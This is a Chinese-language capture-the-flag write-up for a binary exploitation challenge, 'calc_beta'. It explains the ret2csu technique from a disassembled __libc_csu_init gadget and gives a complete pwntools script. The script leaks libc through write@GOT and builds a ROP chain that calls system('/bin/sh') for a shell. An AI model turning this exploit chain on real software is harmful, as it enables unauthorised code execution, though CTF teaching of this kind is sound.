# calc_beta

本题打法很多，除了新生要学但又不太常用的 `ret2csu`，还有很多打法。

比如说，`beta_puts()` 可以当作 `puts` 来使用，这样就可以直接泄露 libc 地址，转化成简单的 `ret2libc`。

或者说，用残留的 `rdx`，结合 `pop rdi; ret` 和 `pop rsi; ret` 以及 `write`，同样可以泄露 libc 地址，并转化成 `ret2libc`。

```asm
  401230:	4c 89 fa             	mov    rdx, r15
  401233:	4c 89 f6             	mov    rsi, r14
  401236:	44 89 ef             	mov    edi, r13d
  401239:	41 ff 14 dc          	call   [r12 + rbx*8]
  40123d:	48 83 c3 01          	add    rbx, 1
  401241:	48 39 dd             	cmp    rbp, rbx
  401244:	75 ea                	jne    401230 <__libc_csu_init+0x40>
  401246:	48 83 c4 08          	add    rsp, 8
  40124a:	5b                   	pop    rbx
  40124b:	5d                   	pop    rbp
  40124c:	41 5c                	pop    r12
  40124e:	41 5d                	pop    r13
  401250:	41 5e                	pop    r14
  401252:	41 5f                	pop    r15
  401254:	c3                   	ret    
```

如上，我们可以用 `pop` 控制 `rbx rbp r12 r13 r14 r15` 六个寄存器，然后再在上面的分支里面，间接控制 `rdx`，`rsi`，`edi` 寄存器，也可以控制执行流 `call [r12+rbx*8]`。

那么用 `ret2csu` 调用 `write` 泄露 libc 地址然后打 `ret2libc` 即可。

```python
from pwn import *
filename = './calc'
libc = ELF("./libc.so.6")
#host= '8.147.132.32'
host = '127.0.0.1'
#port= 14294
port = 1337

sla = lambda x,s : p.sendlineafter(x,s)
sl = lambda s : p.sendline(s)
sa = lambda x,s : p.sendafter(x,s)
s = lambda s : p.send(s)

e = ELF(filename)
context.log_level='debug'
context(arch=e.arch, bits=e.bits, endian=e.endian, os=e.os)

def run(mode, script = ""):
    if "d" in mode:
        p = gdb.debug(filename, script)
    elif "l" in mode:
        p = process(filename)
    elif "r" in mode:
        p = remote(host, port)
    elif "a" in mode:
        p = process(filename)
        gdb.attach(p, script)
    return p

def getp():
    global script
    if len(sys.argv) == 2:
        p = run(sys.argv[1], script)
    else:
        p = run("l", script)
    return p

script = '''
b execve
go
'''

def menu(choice):
    sla('>', str(choice))

def show():
    menu(1)
    nums = []
    for i in range(0, 16):
        p.recvuntil(' = ')
        nums.append(int(p.recvline(keepends=False), 10))
    return nums

def add(idx1, idx2, idx3):
    menu(4)
    menu(1)
    sla('>',str(idx1))
    sla('>',str(idx2))
    sla('>',str(idx3))
    menu(6)

def edit(idx, content):
    menu(2)
    sla('>',str(idx))
    sla('> ',str(content))

def pwn():
    global p
    p = getp()
    pop6 = 0x40124A
    payload = flat(pop6, 0, 0, e.plt['write'], 1, e.got['write'], 0x100)
    payload += p64(e.sym['main'])

    edit(1, 0)
    edit(2, 1)
    edit(3, e.got['write'])
    edit(4, 1)
    edit(5, e.got['write'])
    edit(6, 0x100)
    edit(7, 0x401230)
    edit(8, 0x401254)
    edit(15, e.sym['main'])

    edit(0, pop6)

    libcbase = u64(p.recv(8)) - libc.sym['write']
    eaddr = libcbase + libc.sym['execve']
    rdx = libcbase + 0x0000000000130516
    rsi = libcbase + 0x0000000000023a6a
    rdi = libcbase + 0x000000000002164f
    binsh = libcbase + libc.search("/bin/sh").__next__()
    saddr = libcbase + libc.sym['system']

    # pause()
    edit(1, binsh)
    edit(2, rsi)
    edit(3, 0)
    edit(4, rdx)
    edit(5, 0)
    edit(6, rdi+1)
    edit(7, saddr)
    
    pause()
    edit(0, rdi)

pwn()
p.interactive()
```